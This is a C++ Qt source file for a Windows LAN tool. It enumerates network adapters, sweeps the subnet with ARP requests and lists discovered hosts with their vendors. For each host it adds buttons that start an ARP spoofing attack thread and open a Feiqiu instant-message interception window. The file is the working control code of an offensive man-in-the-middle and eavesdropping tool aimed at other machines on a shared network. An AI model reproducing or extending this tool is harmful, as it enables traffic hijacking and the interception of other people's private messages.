#include "widget.h"
#include "ui_widget.h"
#include "ui_buttonlist.h"

static const  int ADAPTERNUM  = 10;

// 界面展示网卡相关信息
void Widget::fillAdapterInfo(){
    this->getAllAdapterInfo();

    QList<QMap<QString,QString>>::iterator begin = this->mAdapterList.begin();
    for(;begin != this->mAdapterList.end(); begin++){
        QStringList info,ip,ipmask,mac;
        info << "网卡名称" <<(*begin)["info"];
        ip << "IP地址"<<(*begin)["ip"];
        ipmask << "子网掩码"<<(*begin)["ipmask"];
        mac << "物理地址" << (*begin)["mac"];
        QTreeWidgetItem *item = new QTreeWidgetItem(info);
        new QTreeWidgetItem(item,ip);
        new QTreeWidgetItem(item,ipmask);
        new QTreeWidgetItem(item,mac);
        ui->adapterList->addTopLevelItem(item);
    }

}

// 获取所有的网卡相关信息
void Widget::getAllAdapterInfo(){

    PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO[ADAPTERNUM];// 10个网卡空间 足够了
    unsigned long stSize = sizeof(IP_ADAPTER_INFO) * ADAPTERNUM;
    // 获取所有网卡信息，参数二为输入输出参数
    ULONG nRel = GetAdaptersInfo(pIpAdapterInfo,&stSize);
    // 空间不足
    if (ERROR_BUFFER_OVERFLOW == nRel) {
        // 释放空间
        if(pIpAdapterInfo!=nullptr)
            delete[] pIpAdapterInfo;
        return;
    }

    PIP_ADAPTER_INFO cur =  pIpAdapterInfo;
    // 多个网卡 通过链表形式链接起来的
    while(cur){
        QMap<QString,QString> adapter;
        adapter.insert("info",cur->Description);
        switch (cur->Type) {
        case MIB_IF_TYPE_OTHER:
            break;
        case MIB_IF_TYPE_ETHERNET:
        {
            IP_ADDR_STRING *pIpAddrString =&(cur->IpAddressList);
            adapter.insert("ip",pIpAddrString->IpAddress.String);
            adapter.insert("ipmask",pIpAddrString->IpMask.String);
        }
            break;
        case MIB_IF_TYPE_TOKENRING:
            break;
        case MIB_IF_TYPE_FDDI:
            break;
        case MIB_IF_TYPE_PPP:
            break;
        case MIB_IF_TYPE_LOOPBACK:
            break;
        case MIB_IF_TYPE_SLIP:
            break;
        default://无线网卡,Unknown type
        {
            IP_ADDR_STRING *pIpAddrString =&(cur->IpAddressList);
            adapter.insert("ip",pIpAddrString->IpAddress.String);
            adapter.insert("ipmask",pIpAddrString->IpMask.String);
        }
            break;
        }

        char macStr[18] = {0};//12+5+1
        Utils::macToHexString(cur->Address,macStr);

        // mac地址 16进制字符串表示
        adapter.insert("mac",macStr);
        cur = cur->Next;
        this->mAdapterList.append(adapter);
    }

    // 释放空间
    if(pIpAdapterInfo!=nullptr)
        delete[] pIpAdapterInfo;
}
Widget::Widget(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::Widget)
{
    ui->setupUi(this);
    // winsock 初始化
    WSAStartup(MAKEWORD(2,2),&mWasData);
    // 填充网卡信息
    this->fillAdapterInfo();
    // 获取有效网卡设备
    this->mAdapterName = Utils::geValidAdapter();

    this->mUpdateMacThread = new UpdateMacThread();
    connect(this->mUpdateMacThread,&UpdateMacThread::updateDone,this,[=](){
       ui->scanButton->setEnabled(true);
    });

    // 设置表格
    ui->macList->horizontalHeader()->setStretchLastSection(true);//关键
    ui->macList->setColumnWidth(0, 100);
    ui->macList->setColumnWidth(1, 200);
    ui->macList->setColumnWidth(2, 200);
    ui->macList->setContextMenuPolicy(Qt::CustomContextMenu);

}

Widget::~Widget()
{
    WSACleanup();
    if(mArpSendThread != nullptr)
        delete mArpSendThread;
    if(mArpAcceptThread != nullptr)
        delete mArpAcceptThread;
    delete ui;
}

// 开始扫描
void Widget::on_scanButton_clicked()
{
    // 获取选中的网卡，计算扫描网段的 IP
    int index = ui->adapterList->indexOfTopLevelItem(ui->adapterList->currentItem());
    if(index == -1){
        index = ui->adapterList->indexOfTopLevelItem(ui->adapterList->currentItem()->parent());
    }
    QMap<QString,QString> adapter = mAdapterList.at(index);
    QString ip = adapter["ip"];
    QString ipmask = adapter["ipmask"];
    QString mac = adapter["mac"];

    std::string s = mac.toStdString();
    const char* macCh = s.c_str();

    // 网卡验证
    if(QString("0.0.0.0").compare(ip) == 0){
        qDebug() << "无效网卡，请重新选择！";
        QMessageBox *error = new QMessageBox(QMessageBox::Critical,QString("错误")
                                             ,QString("无效的网卡，请选择联网的网卡"),QMessageBox::Ok,this);
        error->show();
        return;
    }
    // MAC 厂商列表
    QFile file("oui.json");
    if(!file.exists()){
        QMessageBox *error = new QMessageBox(QMessageBox::Critical,QString("错误")
                                             ,QString("没有MAC厂商信息，请先更新厂商MAC"),QMessageBox::Ok,this);
        error->show();
        return;
    }
    if(!file.open(QIODevice::ReadOnly)){
        qDebug() << "打开oui.json文件失败";
        return;
    }
    QJsonDocument jsonDoc = QJsonDocument::fromJson(file.readAll());
    file.close();
    QJsonObject factoryMac = jsonDoc.object();

    // 清空表格
    on_clearButton_clicked();
    ui->scanButton->setEnabled(false);
    ui->updateButton->setEnabled(false);
    ui->stopButton->setEnabled(true);

    // inet_addr 是将点分十进制的IP 转为 网络字节序的IP，然后再ntohl转为本地字节序方便计算。
    uint32_t ipmaskByte = ntohl(inet_addr(ipmask.toUtf8().data()));
    uint32_t ipByte = ntohl(inet_addr(ip.toUtf8().data()));
    uint32_t max4Byte = 0xffffffff;

    // 根据子网掩码 计算网络地址
    uint32_t networkAddr = ipByte & ipmaskByte;

    // 子网IP数量
    uint32_t subnetNum = max4Byte ^ ipmaskByte;

    // 计算网段广播地址
    uint32_t broadcastAddr = networkAddr + subnetNum;

    uint8_t macByte[6] = {0};
    Utils::hexToMacByte(macCh,macByte);// 此时macByte已经是网络字节序了
    // 将QMap注册至元对象系统，即可在不同线程中传递QMap对象了。
    typedef QMap<QString,QString> StringMap;
    qRegisterMetaType<StringMap>("StringMap");
    QString adapterName = this->mAdapterName[ip];


    // arp报文接受线程
    mArpAcceptThread = new ArpAcceptThread(adapterName,ip);
    // arp报文发送线程
    mArpSendThread = new ArpSendThread(ipByte,broadcastAddr,networkAddr,macByte,adapterName);


    // 收到ARP应答包
    connect(mArpAcceptThread,&ArpAcceptThread::acceptArp,this,[=](QMap<QString,QString> info){
        mIpMac[info["ip"]] = info["mac"];

        this->mMacNum += 1;
        ui->macList->insertRow(0);
        QTableWidgetItem *item1 = new QTableWidgetItem(info["ip"]);
        ui->macList->setItem(0, 0, item1);

        QTableWidgetItem *item2 = new QTableWidgetItem(info["mac"]);
        ui->macList->setItem(0, 1, item2);

        QTableWidgetItem *item3 = new QTableWidgetItem( factoryMac.find(info["mac"].mid(0,8)).value().toString() );
        ui->macList->setItem(0, 2, item3);

        ButtonList* btn = new ButtonList;
        ui->macList->setCellWidget(0,3,btn);
        connect(btn->ui->arpButton,&QPushButton::clicked,this,[=](){
            if(QString::compare(btn->ui->arpButton->text(),QString("开始ARP欺骗")) == 0){
                 btn->ui->arpButton->setText("停止ARP欺骗");

                 qDebug() << "开始ARP欺骗" << info["ip"] << " " << info["mac"];
                 uint32_t atkIpByte = inet_addr(info["ip"].toStdString().c_str());
                 uint8_t atkMacAddr[6] = {0};
                 Utils::hexToMacByte(info["mac"].toStdString().c_str(),atkMacAddr);
                 uint32_t atkIpByte_host = 0;
                 Utils::ntohN(reinterpret_cast<uint8_t*>(&atkIpByte),reinterpret_cast<uint8_t*>(&atkIpByte_host),4);

                 this->mArpAttackThread = new ArpAttackThread(atkIpByte_host,atkMacAddr,ipByte,broadcastAddr,networkAddr,macByte,adapterName);
                 this->mArpAttackThread->start();
                 connect(this->mArpAttackThread,&ArpAttackThread::stopDone,this,[=](){
                     // 已经停止攻击了
                     btn->ui->arpButton->setText("开始ARP欺骗");
                     btn->ui->arpButton->setEnabled(true);
                     this->mArpAttackThread->terminate();
                     delete this->mArpAttackThread;
                 });
            }else{
                qDebug() << "停止ARP欺骗" << info["ip"] << " " << info["mac"];
                btn->ui->arpButton->setEnabled(false);
                this->mArpAttackThread->stopAttack();
           }

        });

        connect(btn->ui->fqMsgButton,&QPushButton::clicked,[=](){
            qDebug() << "开始飞秋拦截" << info["ip"] ;
            FqMessage* fqMsg = new FqMessage(info["ip"],info["mac"],this->mIpMac);
            fqMsg->show();
        });
    }/*,Qt::QueuedConnection*/);// 不同线程可用队列方式连接

    // 停止扫描
    connect(this,&Widget::stopScan,mArpAcceptThread,&ArpAcceptThread::stopAccept);
    connect(this,&Widget::stopScan,mArpSendThread,&ArpSendThread::stopSend);

    // ARP发送完毕
    connect(mArpSendThread,&ArpSendThread::sendDone,this,[=](){
        // 发送完毕销毁线程资源
        qDebug() << "ARP 报文发送完毕" ;
        ui->scanButton->setEnabled(true);

        mArpAcceptThread->stopAccept();
        mArpSendThread->terminate();
        delete mArpSendThread;
    });
    // 更新进度条
    connect(mArpSendThread,&ArpSendThread::sendOne,this,[=](int num){
        ui->progressBar->setValue(num);
        ui->progressBar->setMaximum(subnetNum-1);// 排除自己
    });


    // ARP接受完毕
    connect(mArpAcceptThread,&ArpAcceptThread::acceptDone,this,[=](){
        // 接受完毕销毁线程资源
        qDebug() << "ARP 报文接受完毕";
        ui->updateButton->setEnabled(true);
        mArpAcceptThread->terminate();
        delete mArpAcceptThread;
    });

    mArpAcceptThread->start();
    mArpSendThread->start();
}

void Widget::on_stopButton_clicked()
{
    emit stopScan();
    ui->stopButton->setEnabled(false);
}

void Widget::on_clearButton_clicked()
{
    ui->macList->clearContents();
    for(int i = 0 ; i < this->mMacNum; i++){
        ui->macList->removeRow(0);
    }
    this->mMacNum = 0;
}

void Widget::on_updateButton_clicked()
{
    ui->updateButton->setEnabled(false);
    ui->scanButton->setEnabled(false);
//    if( true ){
//        mUpdateMacThread->start();
//        return;
//    }
    // 下载厂商MAC列表
    file = new QFile("oui.txt");

    if(file->exists())
        file->resize(0);

    if( !file->open(QIODevice::ReadWrite)){
        qDebug() << "打开oui.txt文件失败";
        return;
    }
    QUrl url("http://standards-oui.ieee.org/oui/oui.txt");
    reply = qnam.get(QNetworkRequest(url));

    connect(reply, &QNetworkReply::finished, this,[=](){
        // 解析文件
        mUpdateMacThread->start();
        if(file)
            file->close();
    });
    connect(reply, &QIODevice::readyRead, this,[=](){
        if(file)
            file->write(reply->readAll());
    });
    connect(reply, &QNetworkReply::downloadProgress, this,[=](qint64 bytesRead, qint64 totalBytes){
        ui->progressBar->setMaximum(totalBytes);
        ui->progressBar->setValue(bytesRead);
    });
}
